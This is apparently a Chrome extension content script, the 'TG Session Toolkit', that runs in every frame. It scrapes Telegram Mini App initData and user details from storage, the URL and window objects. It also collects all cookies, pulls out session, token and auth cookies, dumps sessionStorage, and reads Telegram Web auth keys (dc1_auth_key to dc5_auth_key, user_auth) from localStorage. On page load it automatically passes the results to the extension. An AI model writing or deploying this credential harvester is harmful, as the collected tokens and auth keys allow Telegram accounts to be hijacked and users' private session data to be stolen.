// TG Session Toolkit — content script (runs in all frames)

function collectFrameData() {
  const result = {
    frameUrl: location.href,
    frameOrigin: location.origin,
    initData: '',
    queryId: '',
    userId: '',
    firstName: '',
    lastName: '',
    username: '',
    isPremium: false,
    cookies: {},
    sessionTokens: {},
    iframeData: {}
  };

  function parseInitData(raw) {
    if (!raw || typeof raw !== 'string') return false;
    // Normalize: if still encoded (contains %26 or %3D), decode once
    let decoded = raw;
    try {
      if (raw.includes('%26') || raw.includes('%3D') || raw.includes('%7B')) {
        decoded = decodeURIComponent(raw);
      }
    } catch(e) { decoded = raw; }
    result.initData = decoded;
    try {
      // Use URLSearchParams for reliable parsing of query_id= user= auth_date= etc.
      const sp = new URLSearchParams(decoded);
      const queryId = sp.get('query_id');
      if (queryId) result.queryId = queryId;
      const userStr = sp.get('user');
      if (userStr) {
        const u = JSON.parse(userStr);
        result.userId    = String(u.id || '');
        result.firstName = u.first_name || '';
        result.lastName  = u.last_name  || '';
        result.username  = u.username   || '';
        result.isPremium = !!u.is_premium;
      }
    } catch(e) {
      // Fallback regex if URLSearchParams fails
      try {
        const mu = decoded.match(/user=([^&]+)/);
        if (mu) {
          const u = JSON.parse(decodeURIComponent(mu[1]));
          result.userId    = String(u.id || '');
          result.firstName = u.first_name || '';
          result.lastName  = u.last_name  || '';
          result.username  = u.username   || '';
          result.isPremium = !!u.is_premium;
        }
      } catch(e2) {}
      try {
        const mq = decoded.match(/query_id=([^&]+)/);
        if (mq) result.queryId = decodeURIComponent(mq[1]);
      } catch(e2) {}
    }
    return !!result.initData;
  }

  // 1. sessionStorage __telegram__initParams
  try {
    const raw = sessionStorage.getItem('__telegram__initParams');
    if (raw) {
      const p = JSON.parse(raw);
      if (p.tgWebAppData) parseInitData(p.tgWebAppData);
    }
  } catch(e) {}

  // 2. tapps/launchParams in sessionStorage
  if (!result.initData) {
    try {
      const lp = sessionStorage.getItem('tapps/launchParams');
      if (lp) {
        try {
          const parsed = JSON.parse(lp);
          if (parsed && parsed.tgWebAppData) parseInitData(parsed.tgWebAppData);
        } catch(e2) {}
        if (!result.initData) {
          const m = lp.match(/tgWebAppData=([^&]+)/);
          if (m) parseInitData(decodeURIComponent(m[1]));
        }
      }
    } catch(e) {}
  }

  // 2b. telegram-apps/launch-params (newer SDK)
  if (!result.initData) {
    try {
      const lp = sessionStorage.getItem('telegram-apps/launch-params') || sessionStorage.getItem('launchParams');
      if (lp) {
        try {
          const parsed = JSON.parse(lp);
          if (parsed && parsed.tgWebAppData) parseInitData(parsed.tgWebAppData);
          if (!result.initData && parsed && parsed.initData) parseInitData(parsed.initData);
        } catch(e2) {}
        if (!result.initData) {
          const m = lp.match(/tgWebAppData=([^&]+)/);
          if (m) parseInitData(decodeURIComponent(m[1]));
        }
      }
    } catch(e) {}
  }

  // 3. window.__telegram__initParams
  if (!result.initData) {
    try {
      const p = window.__telegram__initParams;
      if (p && p.tgWebAppData) parseInitData(p.tgWebAppData);
      if (!result.initData && p && p.initData) parseInitData(p.initData);
    } catch(e) {}
  }

  // 4. Telegram.WebView.initParams
  if (!result.initData) {
    try {
      const wp = window.Telegram && window.Telegram.WebView && window.Telegram.WebView.initParams;
      if (wp && wp.tgWebAppData) parseInitData(wp.tgWebAppData);
    } catch(e) {}
  }

  // 5. Telegram.WebApp
  if (!result.initData) {
    try {
      const wa = window.Telegram && window.Telegram.WebApp;
      if (wa && wa.initData) parseInitData(wa.initData);
      if (!result.userId && wa && wa.initDataUnsafe && wa.initDataUnsafe.user) {
        const u = wa.initDataUnsafe.user;
        result.userId    = String(u.id || '');
        result.firstName = u.first_name || '';
        result.isPremium = !!u.is_premium;
      }
    } catch(e) {}
  }

  // 6. URL hash — hỗ trợ cả /#/path?tgWebAppData=... và #tgWebAppData=...
  if (!result.initData) {
    try {
      const hash = location.hash;
      const qIdx = hash.indexOf('?');
      if (qIdx !== -1) {
        const hp = new URLSearchParams(hash.slice(qIdx + 1));
        const v = hp.get('tgWebAppData');
        if (v) parseInitData(v);
      }
      if (!result.initData) {
        const hp2 = new URLSearchParams(hash.replace(/^#\/?[^?]*\??/, '').replace(/^#/, ''));
        const v2 = hp2.get('tgWebAppData');
        if (v2) parseInitData(v2);
      }
      // Regex fallback: handle #tgWebAppData=... directly
      if (!result.initData) {
        const m = hash.match(/[#?&]tgWebAppData=([^&]+)/);
        if (m) parseInitData(decodeURIComponent(m[1]));
      }
    } catch(e) {}
  }

  // 7. URL search params
  if (!result.initData) {
    try {
      const sp = new URLSearchParams(location.search);
      const v = sp.get('tgWebAppData') || sp.get('initData');
      if (v) parseInitData(v);
    } catch(e) {}
  }

  // 8. Scan ALL sessionStorage keys
  if (!result.initData) {
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const val = sessionStorage.getItem(key);
        if (!val) continue;
        // Try parse as JSON first — handles {_path, tgWebAppData, ...} objects
        try {
          const parsed = JSON.parse(val);
          if (parsed && typeof parsed === 'object') {
            if (parsed.tgWebAppData) { parseInitData(parsed.tgWebAppData); if (result.initData) break; }
            if (parsed.initData) { parseInitData(parsed.initData); if (result.initData) break; }
            if (parsed.query_id) { result.queryId = String(parsed.query_id); }
          }
          if (typeof parsed === 'string' && parsed.includes('query_id=')) {
            parseInitData(parsed); if (result.initData) break;
          }
        } catch(e) {}
        if (result.initData) break;
        if (val.includes('tgWebAppData')) {
          const m = val.match(/tgWebAppData=([^&"]+)/);
          if (m) { parseInitData(decodeURIComponent(m[1])); if (result.initData) break; }
          const mj = val.match(/"tgWebAppData"\s*:\s*"([^"]+)"/);
          if (mj) { parseInitData(mj[1].replace(/\\"/g, '"')); if (result.initData) break; }
        }
        if (val.includes('query_id=') && val.includes('user=')) {
          parseInitData(val); if (result.initData) break;
        }
      }
    } catch(e) {}
  }

  // 9. Scan ALL localStorage keys
  if (!result.initData) {
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const val = localStorage.getItem(key);
        if (val && val.includes('tgWebAppData')) {
          const m = val.match(/tgWebAppData=([^&"]+)/);
          if (m) { parseInitData(decodeURIComponent(m[1])); break; }
        }
      }
    } catch(e) {}
  }

  // Collect cookies
  try {
    const cookieStr = document.cookie;
    cookieStr.split(';').forEach(c => {
      const eqIdx = c.indexOf('=');
      if (eqIdx === -1) return;
      const k = c.slice(0, eqIdx).trim();
      const v = c.slice(eqIdx + 1).trim();
      if (k && v) {
        try { result.cookies[k] = decodeURIComponent(v); } catch(e) { result.cookies[k] = v; }
      }
    });
    // Look for session tokens specifically
    cookieStr.split(';').forEach(c => {
      const eqIdx = c.indexOf('=');
      if (eqIdx === -1) return;
      const k = c.slice(0, eqIdx).trim();
      const v = c.slice(eqIdx + 1).trim();
      if (k && v && (k.toLowerCase().includes('session') || k.toLowerCase().includes('token') || k.toLowerCase().includes('auth'))) {
        try { result.sessionTokens[k] = decodeURIComponent(v); } catch(e) { result.sessionTokens[k] = v; }
      }
    });
  } catch(e) {}

  // Collect all sessionStorage snapshot
  try {
    const ssData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      ssData[key] = sessionStorage.getItem(key);
    }
    result.iframeData.sessionStorage = ssData;
  } catch(e) {}

  // Collect localStorage snapshot (limited keys)
  try {
    const lsData = {};
    const importantKeys = ['account1','user_auth','dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key','dc5_auth_key','telegram_auth','tg_auth','session'];
    importantKeys.forEach(key => {
      const v = localStorage.getItem(key);
      if (v) lsData[key] = v;
    });
    result.iframeData.localStorage = lsData;
  } catch(e) {}

  return result;
}

// Listen for messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'collectFrame') {
    const data = collectFrameData();
    sendResponse({ success: true, data });
  }
  return true;
});

// Auto-send on load if we find initData
window.addEventListener('load', () => {
  setTimeout(() => {
    const data = collectFrameData();
    if (data.initData || data.userId) {
      chrome.runtime.sendMessage({ action: 'frameDataFound', data });
    }
  }, 1500);
});